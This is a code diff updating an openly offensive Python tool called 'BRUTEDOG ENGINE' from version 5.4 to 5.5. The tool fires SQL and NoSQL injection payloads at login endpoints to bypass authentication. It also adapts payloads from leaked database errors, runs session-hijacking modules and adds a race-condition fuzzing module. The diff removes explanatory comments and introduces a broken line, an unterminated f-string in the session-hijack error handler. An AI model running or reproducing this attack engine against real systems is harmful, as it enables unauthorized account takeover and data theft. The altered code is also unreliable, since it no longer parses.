@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v5.4 — High-Aggression Adaptive Exploitation & Response-Parsing Engine
+BRUTEDOG ENGINE v5.5 — High-Aggression Adaptive Exploitation & Concurrency Engine
 Features:
 - Interactive target selection & automated resolution
 - Stateful, adaptive response-parsing and payload mutation loop
 - Aggressive NoSQL/SQL time-based blind injection & data extraction
 - Advanced session hijacking, JWT cracking, and cookie privilege escalation
+- High-concurrency race condition and balance/state logic fuzzing
 - Session-cookie security inspection
 - Bounded concurrency with asyncio
 - Live terminal streaming of successful exploits
@@ -25,6 +26,7 @@ from concurrent.futures import ThreadPoolExecutor
 # Import weaponized offensive modules
 from modules.db_assault import run_nosql_assault
 from modules.session_hijack import run_session_hijack
+from modules.race_condition import run_race_condition_test
 
 # ============================================================
 # CONFIGURATION
@@ -32,7 +34,7 @@ from modules.session_hijack import run_session_hijack
 REQUEST_TIMEOUT = 8
 MAX_WORKERS = 5
 MAX_RESPONSE_SIZE = 200_000
-USER_AGENT = "BruteDog-Offensive-Engine/5.4"
+USER_AGENT = "BruteDog-Offensive-Engine/5.5"
 
 LOGIN_PATHS = [
     "/api/auth/callback/credentials",
@@ -192,7 +194,6 @@ def classify_and_adapt(response, current_payload):
     findings = []
     mutated_payloads = []
     
-    # Check for authentication bypass or valid token generation
     if status in [200, 201, 302] and any(k in body.lower() for k in ["token", "success", "session", "welcome", "auth", "jwt"]):
         sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE AUTHENTICATION BYPASS / CREDENTIAL HIT [***]\033[0m\n")
         sys.stdout.write(f"  ├── Payload : {json.dumps(current_payload)}\n")
@@ -204,7 +205,6 @@ def classify_and_adapt(response, current_payload):
             "status": status,
         })
 
-    # Adaptive feedback trigger: If server reflects object structure or throws DB errors, mutate payload deeper
     db_errors = detect_database_errors(body)
     for db_error in db_errors:
         sys.stdout.write(f"\033[93m[!] Adaptive Trigger: Server leaked database error ({db_error}). Mutating payload...\033[0m\n")
@@ -214,13 +214,11 @@ def classify_and_adapt(response, current_payload):
             "evidence": db_error,
             "status": status,
         })
-        # Adaptive mutation: Generate aggressive follow-up injections based on leaked DB type
         if "MongoDB" in db_error:
             mutated_payloads.append({"username": {"$regex": "^admin.*$"}, "password": {"$ne": ""}})
         elif "SQL" in db_error:
             mutated_payloads.append({"username": "admin' UNION SELECT null, version()-- -", "password": "password"})
 
-    # Check for loose cookies
     for issue in inspect_cookie_security(response["headers"]):
         findings.append({
             "type": "SESSION_COOKIE_CONFIGURATION",
@@ -238,7 +236,6 @@ def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
     info(f"Targeting endpoint (Adaptive Mode): {endpoint}")
     results = []
     
-    # Base test queue
     test_queue = [
         {"name": "NoSQL Operator Probe", "payload": {"username": {"$ne": None}, "password": {"$ne": None}}},
         {"name": "SQLi Union Probe", "payload": {"username": "admin' OR '1'='1", "password": "password"}},
@@ -274,7 +271,6 @@ def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
             "findings": findings,
         })
 
-        # Dynamically inject mutated payloads back into the live queue if adaptive triggers fired
         for idx, mutant in enumerate(dynamic_mutations, 1):
             test_queue.insert(0, {
                 "name": f"Adaptive Mutant #{idx}",
@@ -287,7 +283,7 @@ def test_endpoint(host, port, base_path, path, secure, credentials_list=None):
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG ADAPTIVE OFFENSIVE EXPLOITATION ENGINE v5.4")
+    section("BRUTEDOG ADAPTIVE OFFENSIVE EXPLOITATION ENGINE v5.5")
     try:
         if target_host:
             target = target_host.strip()
@@ -342,16 +338,23 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         except Exception as exc:
             error(f"Endpoint worker failed: {exc}")
 
-    # Aggressive Database & Session Hijacking Modules
+    # 1. Aggressive Database Assault
     try:
         await run_nosql_assault(target_url, port=port, use_ssl=secure)
     except Exception as exc:
         error(f"Database assault failed: {exc}")
 
+    # 2. Session Hijacking & Token Forging
     try:
         await run_session_hijack(target_url, port=port, use_ssl=secure)
     except Exception as exc:
-        error(f"Session hijack failed: {exc}")
+        error(f"Session hijack failed: {exc})
+
+    # 3. High-Concurrency Race Condition & Logic Fuzzing
+    try:
+        await run_race_condition_test(target_url, port=port, use_ssl=secure)
+    except Exception as exc:
+        error(f"Race condition module failed: {exc}")
             
     duration = round(time.monotonic() - start, 2)
     
